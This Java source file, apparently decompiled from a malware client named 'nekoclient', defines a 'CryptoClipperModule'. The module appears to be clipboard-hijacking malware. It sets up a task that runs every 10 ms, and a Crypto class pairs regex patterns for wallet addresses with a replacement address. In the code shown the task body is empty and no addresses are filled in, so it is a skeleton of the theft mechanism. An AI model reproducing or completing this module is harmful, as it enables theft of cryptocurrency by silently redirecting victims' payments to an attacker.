package dev.neko.nekoclient.module.impl;

import dev.neko.nekoclient.Client;
import dev.neko.nekoclient.module.Module;
import java.util.Arrays;
import java.util.List;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.regex.Pattern;

public class CryptoClipperModule extends Module {
   public CryptoClipperModule(Client client) {
      super(client);
   }

   @Override
   public String getName() {
      return "CryptoClipper";
   }

   @Override
   protected Module.StartAction run(ScheduledExecutorService service) {
      return new Module.StartAction().schedule(service.scheduleAtFixedRate(() -> {
      }, 10L, 10L, TimeUnit.MILLISECONDS));
   }

   public static class Crypto {
      private final String currency;
      private final List<Pattern> patterns;
      private final String replacement;

      public Crypto(String currency, String replacement, Pattern... patterns) {
         this.currency = currency;
         this.patterns = Arrays.asList(patterns);
         this.replacement = replacement;
      }

      public final boolean test(String string) {
         return this.patterns.stream().anyMatch(pattern -> pattern.matcher(string).matches());
      }

      public final String getReplacement() {
         return this.replacement;
      }

      public final String getCurrency() {
         return this.currency;
      }
   }
}
